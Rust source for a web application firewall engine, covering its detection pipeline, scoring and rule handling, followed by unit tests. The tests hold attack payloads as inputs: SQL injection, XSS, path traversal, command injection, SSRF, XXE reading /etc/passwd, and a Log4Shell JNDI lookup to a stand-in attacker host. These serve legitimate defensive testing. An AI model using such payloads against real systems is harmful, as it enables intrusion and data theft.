//! Main WAF detection engine.
//!
//! The engine is the single entry point used by the proxy / agent crates:
//!
//! ```ignore
//! let engine = WafEngine::new(&WafEngineConfig::default());
//! let verdict = engine.inspect(&request_data);
//! match verdict.action {
//!     WafAction::Block => return forbidden(),
//!     WafAction::Challenge => return challenge_page(),
//!     _ => forward_to_origin(),
//! }
//! ```
//!
//! Internally the engine runs the multi-stage pipeline documented on
//! [`WafEngine::inspect`].

use std::net::IpAddr;
use std::str::FromStr;

use serde::{Deserialize, Serialize};

use crate::normalize::ValueSource;
use crate::normalize::{normalize_request, NormalizedRequest};
use crate::rules::expression::{evaluate, EvalContext};
use crate::rules::managed::default_managed_rules;
use crate::rules::signatures::{
    detect_expr_injection, detect_js_call, detect_sqli, detect_xss,
    AttackCategory, SignatureEngine, SignatureHit,
};
use crate::rules::{CompiledRule, RuleAction};
use crate::score::{AnomalyScorer, ScoreBreakdown, ScoreClass};
use crate::{StackSet, WafAction, WafLevel, WafVerdict};

/// Operating mode for the engine.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default,
)]
#[serde(rename_all = "snake_case")]
pub enum WafMode {
    /// Engine is disabled — every request returns `Pass` immediately.
    Off,
    /// Detect and log but never block. Verdicts are downgraded from
    /// `Block`/`Challenge` to `Monitor`.
    Monitor,
    /// Full enforcement.
    #[default]
    Block,
}

/// Static configuration used to build a [`WafEngine`].
#[derive(Debug, Clone)]
pub struct WafEngineConfig {
    pub mode: WafMode,
    /// Detection level. Normal keeps the low-false-positive defaults;
    /// Strict enables the escape-decoding pass, structural EL/SSTI
    /// detection, Strict-only needles and rules, tightened sub-score gates
    /// and paranoia-level-3 rules.
    pub level: WafLevel,
    /// Backend stacks deployed behind this engine. `GENERIC` patterns and
    /// rules are always active; language-scoped ones (Java deserialization,
    /// PHP unserialize, …) load only when their stack is listed. Defaults to
    /// every stack so unconfigured deployments keep full coverage.
    pub stacks: StackSet,
    /// Aggregate-score block threshold (default 40).
    pub threshold: u32,
    /// 1 (loose) … 4 (paranoid).
    pub paranoia_level: u8,
    /// Maximum URL-decoding passes (default 3).
    pub max_decode_layers: usize,
    /// User-supplied rules; combined with managed defaults when
    /// `enable_managed_rules` is true.
    pub rules: Vec<CompiledRule>,
    pub enable_managed_rules: bool,
    /// When `true`, a Stage-1 critical hit short-circuits to an immediate
    /// Block verdict without running the rule engine.
    pub fast_path_block_on_critical: bool,
}

impl Default for WafEngineConfig {
    fn default() -> Self {
        Self {
            mode: WafMode::Block,
            level: WafLevel::Normal,
            stacks: StackSet::ALL,
            threshold: 40,
            paranoia_level: 2,
            max_decode_layers: 3,
            rules: Vec::new(),
            enable_managed_rules: true,
            fast_path_block_on_critical: true,
        }
    }
}

/// Input data for a single inspection.
#[derive(Debug, Clone)]
pub struct RequestData {
    pub method: String,
    pub path: String,
    /// Raw query string (without the leading `?`).
    pub query: String,
    /// Header pairs in wire order; names will be lower-cased internally.
    pub headers: Vec<(String, String)>,
    pub body: Option<Vec<u8>>,
    pub client_ip: String,
    /// Optional GeoIP country code (ISO-3166 alpha-2).
    pub country_code: Option<String>,
    /// `"http"` or `"https"`.
    pub scheme: String,
    /// Wire protocol, e.g. `"HTTP/1.1"` or `"HTTP/2.0"`.
    pub protocol: String,
}

impl RequestData {
    pub fn new(method: impl Into<String>, path: impl Into<String>) -> Self {
        Self {
            method: method.into(),
            path: path.into(),
            query: String::new(),
            headers: Vec::new(),
            body: None,
            client_ip: String::new(),
            country_code: None,
            scheme: "http".into(),
            protocol: "HTTP/1.1".into(),
        }
    }
}

/// Deferred Stage-1 hit record. Scoring happens inline while the value is
/// hot, but the human-readable strings are only materialized when the verdict
/// turns out to be something other than a clean pass — the overwhelmingly
/// common case pays zero formatting cost.
enum HitRec<'a> {
    /// Aho-Corasick signature hit; metadata resolved through the engine's
    /// pattern table at string-build time.
    Sig {
        pattern: u32,
        severity: u8,
        source: &'static str,
        name: &'a str,
    },
    /// libinjection-style detector hit. The severity is applied to the
    /// scorer inline; the record only carries what string-building needs.
    Lib {
        kind: &'static str,
        fingerprint: String,
        source: &'static str,
        name: &'a str,
    },
    /// Structural expression-injection hit (Strict level only).
    Expr {
        container: &'static str,
        source: &'static str,
        name: &'a str,
    },
}

/// A Stage-2 rule match, recorded by reference and stringified only when the
/// verdict needs details.
struct RuleRec<'a> {
    id: &'a str,
    name: &'a str,
    action: RuleAction,
    severity: u8,
}

/// Multi-stage WAF detection engine. Clone is intentionally not derived —
/// share an `Arc<WafEngine>` instead so the Aho-Corasick automaton stays put.
pub struct WafEngine {
    signatures: SignatureEngine,
    rules: Vec<CompiledRule>,
    scorer: AnomalyScorer,
    mode: WafMode,
    level: WafLevel,
    stacks: StackSet,
    max_decode_layers: usize,
    fast_path_block_on_critical: bool,
}

impl std::fmt::Debug for WafEngine {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("WafEngine")
            .field("mode", &self.mode)
            .field("level", &self.level)
            .field("stacks", &self.stacks.bits())
            .field("rule_count", &self.rules.len())
            .field("signature_count", &self.signatures.pattern_count())
            .field("scorer", &self.scorer)
            .finish()
    }
}

impl Default for WafEngine {
    fn default() -> Self {
        Self::new(&WafEngineConfig::default())
    }
}

impl WafEngine {
    pub fn new(config: &WafEngineConfig) -> Self {
        let mut rules = Vec::with_capacity(config.rules.len() + 16);
        if config.enable_managed_rules {
            rules.extend(default_managed_rules(config.level));
        }
        rules.extend(config.rules.iter().cloned());

        Self {
            signatures: SignatureEngine::for_profile(
                config.level,
                config.stacks,
            ),
            rules,
            scorer: AnomalyScorer::new(config.threshold, config.paranoia_level),
            mode: config.mode,
            level: config.level,
            stacks: config.stacks,
            max_decode_layers: config.max_decode_layers.clamp(1, 5),
            fast_path_block_on_critical: config.fast_path_block_on_critical,
        }
    }

    /// Paranoia level actually used for rule gating. The Strict level implies
    /// at least PL3, so the size/empty-UA rules activate without the operator
    /// having to touch the knob.
    fn effective_paranoia(&self) -> u8 {
        if self.level.is_strict() {
            self.scorer.paranoia_level.max(3)
        } else {
            self.scorer.paranoia_level
        }
    }

    /// Hot-reload the user rule set. Managed defaults are preserved.
    pub fn update_rules(&mut self, user_rules: Vec<CompiledRule>) {
        let managed: Vec<CompiledRule> = self
            .rules
            .drain(..)
            .filter(|r| r.id.starts_with("PINGWAF-"))
            .collect();
        self.rules = managed;
        self.rules.extend(user_rules);
    }

    /// Replace the entire rule set, including managed defaults.
    pub fn replace_all_rules(&mut self, rules: Vec<CompiledRule>) {
        self.rules = rules;
    }

    pub fn set_mode(&mut self, mode: WafMode) {
        self.mode = mode;
    }

    pub fn mode(&self) -> WafMode {
        self.mode
    }

    pub fn set_threshold(&mut self, threshold: u32) {
        self.scorer.threshold = threshold.max(1);
    }

    pub fn set_paranoia_level(&mut self, level: u8) {
        self.scorer.paranoia_level = level.clamp(1, 4);
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Main inspection entry point.
    ///
    /// Pipeline:
    /// 1. Normalize the request (URL multi-decode, HTML entity decode, path
    ///    collapse, query/cookie split; escape-sequence decoding at Strict).
    /// 2. Stage 1 — Aho-Corasick signature scan + libinjection SQLi/XSS over
    ///    every decoded value. Each hit feeds the anomaly scorer. Referer /
    ///    User-Agent hits in the reflected families (SQLi / XSS / RCE) are
    ///    demoted to weak signals; the Strict level promotes the
    ///    high-confidence injection families to critical and adds structural
    ///    expression-injection detection.
    /// 3. If `fast_path_block_on_critical` and a critical hit landed,
    ///    short-circuit to a Block verdict without running Stage 2.
    /// 4. Stage 2 — evaluate compiled rules against an [`EvalContext`] that
    ///    already exposes the Stage-1 sub-scores. Allow actions short-circuit
    ///    the rest of the rule set.
    /// 5. Combine the aggregate score with the engine threshold and mode to
    ///    pick the final action. Hit strings are only materialized when the
    ///    verdict is something other than a clean pass, so the happy path
    ///    pays zero formatting cost.
    pub fn inspect(&self, request: &RequestData) -> WafVerdict {
        if self.mode == WafMode::Off {
            return WafVerdict::pass();
        }

        let normalized = normalize_request(
            &request.method,
            &request.path,
            &request.query,
            &request.headers,
            request.body.as_deref(),
            self.max_decode_layers,
            self.level.is_strict(),
        );
        let paranoia = self.effective_paranoia();

        let mut breakdown = ScoreBreakdown::clean();
        let mut recs: Vec<HitRec> = Vec::new();
        let mut critical_hit = false;

        // Reused scan buffers: a full request costs one allocation here
        // instead of one per inspected value.
        let mut hits: Vec<SignatureHit> = Vec::new();
        let mut seen: Vec<u32> = Vec::new();

        // ----- Stage 1: signatures + libinjection over every decoded value -----
        for value in &normalized.decoded_values {
            let needle = value.decoded.as_str();
            if needle.is_empty() {
                continue;
            }
            // Reflected display metadata (Referer / User-Agent) is not an
            // execution surface the way query/body/cookie values are: real
            // SQLi lands in fields the backend feeds to an interpreter,
            // while a Referer quoting "union select" is overwhelmingly
            // search-result noise. Demote those two headers to weak signals
            // for the reflected families — structural backend-parsing
            // families (Log4Shell, XXE, deserialization) keep full severity
            // because a JVM parses *every* header it receives.
            let is_meta_header = value.source == ValueSource::Header
                && (value.name.eq_ignore_ascii_case("referer")
                    || value.name.eq_ignore_ascii_case("user-agent"));

            self.signatures.scan_into(needle, &mut hits, &mut seen);
            for hit in &hits {
                let mut severity = hit.severity;
                let mut critical = severity >= 5;
                let reflected_family = matches!(
                    hit.category,
                    AttackCategory::SqlInjection
                        | AttackCategory::Xss
                        | AttackCategory::CommandInjection
                );
                if is_meta_header && reflected_family {
                    severity = 2;
                    critical = false;
                } else if value.source == ValueSource::Body
                    && reflected_family
                    && !self.level.is_strict()
                {
                    // Bulk body content (JSON/XML/HTML payloads) carries the
                    // same strings benignly; a lone reflected-family needle
                    // there is a weak signal — same tier as reflected
                    // metadata headers. Corroboration (3+ distinct hits
                    // crossing a family gate) or the Strict level restores
                    // enforcement.
                    severity = severity.min(2);
                    critical = false;
                } else if self.level.is_strict()
                    && matches!(
                        hit.category,
                        AttackCategory::CrlfInjection
                            | AttackCategory::CommandInjection
                            | AttackCategory::Deserialization
                    )
                {
                    // High-confidence injection families block outright at
                    // the Strict level instead of waiting for the scorer.
                    critical = true;
                }
                if critical {
                    critical_hit = true;
                }
                self.scorer.add_category_hit(
                    &mut breakdown,
                    hit.category,
                    severity,
                );
                recs.push(HitRec::Sig {
                    pattern: hit.pattern,
                    severity,
                    source: value.source.as_str(),
                    name: &value.name,
                });
            }

            // libinjection-style detectors on user-controlled values only.
            // Path/method/header-name are not attacker-typed strings the same
            // way query / body / cookie values are.
            if !matches!(
                value.source,
                ValueSource::QueryParam
                    | ValueSource::Cookie
                    | ValueSource::Body
                    | ValueSource::Header
            ) {
                continue;
            }
            let (is_sqli, sqli_fp) = detect_sqli(needle);
            if is_sqli {
                let weak = is_meta_header
                    || (value.source == ValueSource::Body
                        && !self.level.is_strict());
                let (severity, critical) =
                    if weak { (2, false) } else { (5, true) };
                if critical {
                    critical_hit = true;
                }
                self.scorer.add_category_hit(
                    &mut breakdown,
                    AttackCategory::SqlInjection,
                    severity,
                );
                recs.push(HitRec::Lib {
                    kind: "libinjection-sqli",
                    fingerprint: sqli_fp,
                    source: value.source.as_str(),
                    name: &value.name,
                });
            }
            let (is_xss, xss_fp) = detect_xss(needle);
            if is_xss {
                let weak = is_meta_header
                    || (value.source == ValueSource::Body
                        && !self.level.is_strict());
                let (severity, critical) =
                    if weak { (2, false) } else { (5, true) };
                if critical {
                    critical_hit = true;
                }
                self.scorer.add_category_hit(
                    &mut breakdown,
                    AttackCategory::Xss,
                    severity,
                );
                recs.push(HitRec::Lib {
                    kind: "libinjection-xss",
                    fingerprint: xss_fp,
                    source: value.source.as_str(),
                    name: &value.name,
                });
            }

            // Strict level: structural EL / SSTI detection over the decoded
            // value. A container with interpreter-facing shape is treated as
            // a critical hit; Normal only scores template openers.
            if self.level.is_strict() {
                if let Some(container) = detect_expr_injection(needle) {
                    self.scorer.add_expr_hit(&mut breakdown);
                    critical_hit = true;
                    recs.push(HitRec::Expr {
                        container,
                        source: value.source.as_str(),
                        name: &value.name,
                    });
                } else if detect_js_call(needle) {
                    self.scorer.add_expr_hit(&mut breakdown);
                    critical_hit = true;
                    recs.push(HitRec::Expr {
                        container: "js-call",
                        source: value.source.as_str(),
                        name: &value.name,
                    });
                }
            }
        }

        // Also scan the normalized path itself — traversal patterns commonly
        // appear after `..` resolution rather than in raw query params.
        self.signatures
            .scan_into(&normalized.path, &mut hits, &mut seen);
        for hit in &hits {
            let critical = hit.severity >= 5
                || (self.level.is_strict()
                    && matches!(
                        hit.category,
                        AttackCategory::CrlfInjection
                            | AttackCategory::CommandInjection
                            | AttackCategory::Deserialization
                    ));
            if critical {
                critical_hit = true;
            }
            self.scorer.add_category_hit(
                &mut breakdown,
                hit.category,
                hit.severity,
            );
            recs.push(HitRec::Sig {
                pattern: hit.pattern,
                severity: hit.severity,
                source: "path",
                name: "",
            });
        }

        // ----- Build evaluation context (snapshot of Stage-1 scores) -----
        let parsed_ip = IpAddr::from_str(&request.client_ip).ok();
        let ssl = request.scheme.eq_ignore_ascii_case("https");
        let ctx = EvalContext {
            method: &normalized.method,
            path: &normalized.path,
            full_uri: &normalized.full_uri,
            host: normalized.host(),
            user_agent: normalized.user_agent(),
            body: normalized.body_str(),
            headers: normalized.headers,
            cookies: &normalized.cookies,
            client_ip: &request.client_ip,
            parsed_ip,
            country_code: request.country_code.as_deref(),
            ssl,
            waf_score: breakdown.total,
            waf_score_sqli: breakdown.sqli_score,
            waf_score_xss: breakdown.xss_score,
            waf_score_rce: breakdown.rce_score,
        };

        // ----- Allow pre-pass -----
        // Allow rules are allowlist entries: they must win over both the
        // Stage-1 fast path and every other rule, otherwise an operator
        // could not exempt a health-check endpoint or an internal network.
        for rule in &self.rules {
            if !rule.enabled || rule.action != RuleAction::Allow {
                continue;
            }
            if rule.paranoia_level > paranoia
                || !self.stacks.contains(rule.stacks)
            {
                continue;
            }
            if !evaluate(&rule.expression, &ctx) {
                continue;
            }
            let mut matched = self.matched_from(&recs, &[]);
            matched.push(rule.id.clone());
            return WafVerdict {
                action: WafAction::Pass,
                score: breakdown.total_u8(),
                matched_rules: matched,
                details: format!(
                    "allow-rule matched: {} [{}]",
                    rule.id, rule.name
                ),
                breakdown,
            };
        }

        // ----- Fast-path Block on critical Stage-1 hit -----
        if self.fast_path_block_on_critical && critical_hit {
            return self.finalize_verdict(
                &mut breakdown,
                self.matched_from(&recs, &[]),
                self.details_from(&recs, &[]),
                Some(WafAction::Block),
                "stage1-critical",
            );
        }

        // ----- Stage 2: rule engine (non-Allow rules) -----
        let mut rule_recs: Vec<RuleRec> = Vec::new();
        let mut forced_action: Option<WafAction> = None;
        for rule in &self.rules {
            if !rule.enabled || rule.action == RuleAction::Allow {
                continue;
            }
            if rule.paranoia_level > paranoia
                || !self.stacks.contains(rule.stacks)
            {
                continue;
            }
            if !evaluate(&rule.expression, &ctx) {
                continue;
            }
            rule_recs.push(RuleRec {
                id: &rule.id,
                name: &rule.name,
                action: rule.action,
                severity: rule.severity,
            });
            match rule.action {
                RuleAction::Allow => {
                    unreachable!("allow rules handled in pre-pass")
                },
                RuleAction::Log => {
                    self.scorer.add_severity_hit(&mut breakdown, rule.severity);
                },
                RuleAction::Block => {
                    self.scorer.add_severity_hit(&mut breakdown, rule.severity);
                    forced_action = Some(WafAction::Block);
                },
                RuleAction::Challenge | RuleAction::JsChallenge => {
                    self.scorer.add_severity_hit(&mut breakdown, rule.severity);
                    if forced_action != Some(WafAction::Block) {
                        forced_action = Some(WafAction::Challenge);
                    }
                },
            }
        }

        // ----- Final scoring -----
        breakdown.overall_class = self.scorer.classify(breakdown.total);
        let action = if let Some(a) = forced_action {
            a
        } else if self.scorer.should_block(breakdown.total) {
            WafAction::Block
        } else if breakdown.total > 0 {
            // Below threshold but something fired — surface it as Monitor so
            // the caller still logs the event.
            WafAction::Monitor
        } else {
            WafAction::Pass
        };

        // A clean pass never materializes hit strings — zero formatting
        // cost on the happy path. `Pass` can only be reached when nothing
        // fired anywhere (any hit or Log rule would have raised the score).
        if action == WafAction::Pass {
            debug_assert!(recs.is_empty() && rule_recs.is_empty());
            return WafVerdict::pass();
        }

        let reason = match breakdown.overall_class {
            ScoreClass::Clean => "clean",
            ScoreClass::LikelyClean => "likely-clean",
            ScoreClass::LikelyAttack => "likely-attack",
            ScoreClass::Attack => "attack",
        };
        self.finalize_verdict(
            &mut breakdown,
            self.matched_from(&recs, &rule_recs),
            self.details_from(&recs, &rule_recs),
            Some(action),
            reason,
        )
    }

    /// Rule identifiers for every recorded hit, in first-seen order.
    fn matched_from(
        &self,
        recs: &[HitRec<'_>],
        rules: &[RuleRec<'_>],
    ) -> Vec<String> {
        let mut matched = Vec::with_capacity(recs.len() + rules.len());
        for rec in recs {
            match rec {
                HitRec::Sig { pattern, .. } => matched
                    .push(self.signatures.pattern_id(*pattern).to_string()),
                HitRec::Lib { kind, .. } => matched.push(kind.to_string()),
                HitRec::Expr { .. } => matched.push("EXPR-INJ".to_string()),
            }
        }
        for rule in rules {
            matched.push(rule.id.to_string());
        }
        matched
    }

    /// Human-readable explanation for every recorded hit.
    fn details_from(
        &self,
        recs: &[HitRec<'_>],
        rules: &[RuleRec<'_>],
    ) -> Vec<String> {
        let mut details = Vec::with_capacity(recs.len() + rules.len());
        for rec in recs {
            match rec {
                HitRec::Sig {
                    pattern,
                    severity,
                    source,
                    name,
                } => {
                    let p = self.signatures.pattern(*pattern);
                    details.push(format!(
                        "{} [{} sev={}] in {} '{}'",
                        p.id, p.category, severity, source, name
                    ));
                },
                HitRec::Lib {
                    kind,
                    fingerprint,
                    source,
                    name,
                    ..
                } => {
                    details.push(format!(
                        "{} [{}] in {} '{}'",
                        kind, fingerprint, source, name
                    ));
                },
                HitRec::Expr {
                    container,
                    source,
                    name,
                } => {
                    details.push(format!(
                        "expr-injection [{}] in {} '{}'",
                        container, source, name
                    ));
                },
            }
        }
        for rule in rules {
            details.push(format!(
                "{} [{}] action={} sev={}",
                rule.id,
                rule.name,
                rule.action.as_str(),
                rule.severity
            ));
        }
        details
    }

    fn finalize_verdict(
        &self,
        breakdown: &mut ScoreBreakdown,
        matched: Vec<String>,
        details: Vec<String>,
        action: Option<WafAction>,
        reason: &str,
    ) -> WafVerdict {
        breakdown.overall_class = self.scorer.classify(breakdown.total);
        let mut action = action.unwrap_or(WafAction::Pass);
        if self.mode == WafMode::Monitor
            && matches!(action, WafAction::Block | WafAction::Challenge)
        {
            action = WafAction::Monitor;
        }
        // De-dup matched ids while preserving first-seen order.
        let mut seen: Vec<String> = Vec::with_capacity(matched.len());
        for id in matched {
            if !seen.contains(&id) {
                seen.push(id);
            }
        }
        let detail_str = if details.is_empty() {
            reason.to_string()
        } else {
            format!("{}: {}", reason, details.join("; "))
        };
        WafVerdict {
            action,
            score: breakdown.total_u8(),
            matched_rules: seen,
            details: detail_str,
            breakdown: *breakdown,
        }
    }

    /// Expose the normalized view of a request — handy for tests and for
    /// upstream code that wants to log what the WAF actually saw.
    pub fn normalize<'a>(
        &self,
        request: &'a RequestData,
    ) -> NormalizedRequest<'a> {
        normalize_request(
            &request.method,
            &request.path,
            &request.query,
            &request.headers,
            request.body.as_deref(),
            self.max_decode_layers,
            self.level.is_strict(),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn engine() -> WafEngine {
        WafEngine::new(&WafEngineConfig::default())
    }

    fn req(method: &str, path: &str, query: &str) -> RequestData {
        RequestData {
            method: method.into(),
            path: path.into(),
            query: query.into(),
            headers: vec![
                ("User-Agent".into(), "Mozilla/5.0".into()),
                ("Host".into(), "example.com".into()),
            ],
            body: None,
            client_ip: "203.0.113.10".into(),
            country_code: Some("US".into()),
            scheme: "https".into(),
            protocol: "HTTP/1.1".into(),
        }
    }

    #[test]
    fn passes_clean_request() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api/users", "page=1&limit=20"));
        assert_eq!(v.action, WafAction::Pass, "details: {}", v.details);
        assert_eq!(v.score, 0);
        assert!(v.matched_rules.is_empty());
    }

    #[test]
    fn blocks_sqli_in_query() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api/users", "id=1' OR 1=1 --"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
        assert!(v.score > 0);
        assert!(!v.matched_rules.is_empty());
    }

    #[test]
    fn blocks_union_select() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/api/users",
            "id=1 UNION SELECT username, password FROM users",
        ));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_xss_script() {
        let e = engine();
        let v =
            e.inspect(&req("GET", "/search", "q=<script>alert(1)</script>"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_xss_onerror() {
        let e = engine();
        let v =
            e.inspect(&req("GET", "/search", "q=<img src=x onerror=alert(1)>"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_path_traversal() {
        let e = engine();
        let v = e.inspect(&req("GET", "/files", "p=../../etc/passwd"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_double_encoded_traversal() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/files",
            "p=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        ));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_command_injection() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api", "cmd=;cat /etc/passwd"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_command_substitution() {
        let e = engine();
        let v = e.inspect(&req("GET", "/api", "cmd=$(whoami)"));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn blocks_ssrf_metadata() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/proxy",
            "url=http://169.254.169.254/latest/",
        ));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn monitor_mode_does_not_block() {
        let cfg = WafEngineConfig {
            mode: WafMode::Monitor,
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/api/users", "id=1' OR 1=1 --"));
        assert_eq!(v.action, WafAction::Monitor);
        assert!(v.score > 0);
    }

    #[test]
    fn off_mode_skips_everything() {
        let cfg = WafEngineConfig {
            mode: WafMode::Off,
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/api/users", "id=1' OR 1=1 --"));
        assert_eq!(v.action, WafAction::Pass);
        assert_eq!(v.score, 0);
    }

    #[test]
    fn allow_rule_short_circuits() {
        let custom = CompiledRule::compile(
            "ALLOW-HEALTH",
            "allow health checks",
            r#"http.request.uri.path eq "/healthz""#,
            RuleAction::Allow,
            1,
            vec!["allow".into()],
        )
        .unwrap();
        let cfg = WafEngineConfig {
            rules: vec![custom],
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/healthz", "id=1' OR 1=1 --"));
        assert_eq!(v.action, WafAction::Pass);
    }

    #[test]
    fn block_rule_on_path() {
        let custom = CompiledRule::compile(
            "BLOCK-SECRET",
            "block /secret",
            r#"http.request.uri.path starts_with "/secret""#,
            RuleAction::Block,
            5,
            vec!["custom".into()],
        )
        .unwrap();
        let cfg = WafEngineConfig {
            rules: vec![custom],
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let v = e.inspect(&req("GET", "/secret/data", ""));
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
        assert!(v.matched_rules.contains(&"BLOCK-SECRET".to_string()));
    }

    #[test]
    fn cidr_rule_matches_internal_ip() {
        let custom = CompiledRule::compile(
            "ALLOW-INTERNAL",
            "allow internal",
            "ip.src in {10.0.0.0/8}",
            RuleAction::Allow,
            1,
            vec![],
        )
        .unwrap();
        let cfg = WafEngineConfig {
            rules: vec![custom],
            ..Default::default()
        };
        let e = WafEngine::new(&cfg);
        let mut r = req("GET", "/api", "id=1' OR 1=1 --");
        r.client_ip = "10.1.2.3".into();
        let v = e.inspect(&r);
        assert_eq!(v.action, WafAction::Pass);
    }

    #[test]
    fn body_payload_detected() {
        let e = engine();
        let mut r = req("POST", "/api/comment", "");
        r.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        r.body = Some(b"comment=<script>alert(1)</script>&author=bob".to_vec());
        let v = e.inspect(&r);
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn hot_reload_rules() {
        let mut e = engine();
        let initial = e.rule_count();
        let custom = CompiledRule::compile(
            "CUSTOM-1",
            "custom",
            r#"http.host eq "blocked.com""#,
            RuleAction::Block,
            4,
            vec![],
        )
        .unwrap();
        e.update_rules(vec![custom]);
        // Managed rules preserved, plus one custom.
        assert_eq!(e.rule_count(), initial + 1);
    }

    #[test]
    fn log4shell_in_user_agent_blocked() {
        let e = engine();
        let mut r = req("GET", "/", "");
        r.headers.push((
            "User-Agent".into(),
            "${jndi:ldap://attacker.com/x}".into(),
        ));
        let v = e.inspect(&r);
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn xxe_in_body_blocked() {
        let e = engine();
        let mut r = req("POST", "/api/xml", "");
        r.body = Some(
            br#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#
                .to_vec(),
        );
        let v = e.inspect(&r);
        assert!(matches!(v.action, WafAction::Block | WafAction::Monitor));
    }

    #[test]
    fn verdict_breakdown_populated() {
        let e = engine();
        let v =
            e.inspect(&req("GET", "/api/users", "id=1' UNION SELECT 1,2,3 --"));
        assert!(v.breakdown.total > 0);
        assert!(v.breakdown.sqli_score > 0);
        assert!(!matches!(v.breakdown.overall_class, ScoreClass::Clean));
    }

    fn strict_engine() -> WafEngine {
        WafEngine::new(&WafEngineConfig {
            level: WafLevel::Strict,
            ..Default::default()
        })
    }

    #[test]
    fn blocks_log4shell_in_query() {
        // Regression guard: the benchmark showed this payload shape slipping
        // through, so pin the full-pipeline behavior.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/solr/admin/cores",
            "action=${jndi:ldap://${sys:java.version}.example.com}",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn referer_sqli_is_not_blocked_in_normal() {
        // A Referer quoting an SQL payload is search-result noise, not an
        // injection attempt — it must score, not block.
        let e = engine();
        let mut r = req("GET", "/article", "id=1");
        r.headers.push((
            "Referer".into(),
            "https://google.com/search?q=1' UNION SELECT password FROM users --"
                .into(),
        ));
        let v = e.inspect(&r);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        assert!(matches!(v.action, WafAction::Pass | WafAction::Monitor));
    }

    #[test]
    fn strict_blocks_rce_command_substitution() {
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/login/index.php",
            "login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.)",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn blocks_traversal_masked_by_prefix_match() {
        // Regression guard: Aho-Corasick consumes non-overlapping matches,
        // so "../" swallowed the "/" that "/etc/passwd" needed. The
        // slash-less variant PT-013 must still fire.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/download",
            "page=../../../etc/passwd%00.png",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn blocks_time_based_blind_sqli() {
        // Regression guard: time-based payloads carried only a sev-4 needle
        // and scored 4 — far below the anomaly threshold — so they passed.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/api/login",
            "u=admin';WAITFOR DELAY '0:0:10'--",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn strict_blocks_js_bracket_call() {
        // Bracket-call invocation hides the callee name (often hex-escaped)
        // from keyword needles; caught structurally at Strict.
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/render",
            "tpl=parent['eval'](atob('YWxlcnQoMSk='))",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn normal_passes_plain_bracket_access() {
        // Bracket text alone is not a call — Normal must stay quiet, and the
        // JS-call detector is Strict-only anyway.
        let e = engine();
        let v = e.inspect(&req("GET", "/items", "filter=rows[0].name"));
        assert_eq!(v.action, WafAction::Pass, "details: {}", v.details);
    }

    #[test]
    fn normal_scores_rce_without_blocking() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/login/index.php",
            "login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.)",
        ));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        assert!(v.score > 0);
    }

    #[test]
    fn strict_blocks_structural_ssti() {
        let e = strict_engine();
        let v = e.inspect(&req("GET", "/page", "tpl={{7*7}}"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn normal_does_not_block_structural_ssti() {
        let e = engine();
        let v = e.inspect(&req("GET", "/page", "tpl={{7*7}}"));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        assert!(v.score > 0);
    }

    #[test]
    fn strict_activates_paranoia_level_3_rules() {
        let e = strict_engine();
        // 1051 (very long URI) is a PL3 rule; the strict engine's effective
        // paranoia is at least 3, so it fires without extra configuration.
        let long = "x".repeat(5000);
        let v = e.inspect(&req("GET", &format!("/{long}"), ""));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        assert!(v.matched_rules.iter().any(|m| m == "PINGWAF-1051"));
    }

